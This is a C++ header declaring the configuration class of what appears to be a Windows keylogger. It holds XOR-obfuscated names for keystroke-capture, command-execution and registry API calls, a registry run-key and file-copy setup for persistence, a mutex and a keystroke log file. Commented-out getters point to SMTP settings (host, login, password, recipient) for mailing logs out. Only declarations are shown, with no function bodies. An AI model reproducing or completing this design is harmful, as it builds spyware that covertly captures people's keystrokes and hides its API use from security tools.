#ifndef CONFIG_H
#define CONFIG_H

#include "xor.h"

class Config
{
public:
    Config();

    string regKeyDir;
    string regKeyName;
    string regFilePath;
    string mutexRunKey;
    string timeFileName;
    string logFileName;

    string advapi32Libray;
    string kernel32Libray;
    string user32Libray;

    string CopyFileAFunction;
    string RegOpenKeyExAFunction;
    string RegSetValueExAFunction;
    string RegCloseKeyFunction;
    string RegDeleteKeyAFuntion;
    string WinExecFunction;
    string AsyncKeyStateFunction;

    //int GetSendMailTime();
    //string GetHost();
    //string GetLogin();
    //string GetPassword();
    //string GetPort();
    //string GetToMail();
    string GetKey();
    string GetRegFilePath();
    string GetRegKeyName();
    string GetRegKeyDir();
    string GetMutexRunKey();
    string GetTimeFileName();
    string GetLogFileName();
    string getComputerName();
    //string getEmailSubject();
    LPCTSTR StringToLPCTSTR(string str);
    void generateFileConfig();
    string GetAsyncKeyStateFunction();
    string GetCopyFileAFunction();
    string GetRegCloseKeyFunction();
    string GetRegDeleteValueFunction();
    string GetRegOpenKeyExAFunction();
    string GetRegSetValueExAFunction();
    string GetWinExecFunction();
    string GetAdvapi32Libray();
    string GetKernel32Libray();
    string GetUser32Libray();
private:
    string key;
    Xor *xorTmp;
};

#endif // CONFIG_H
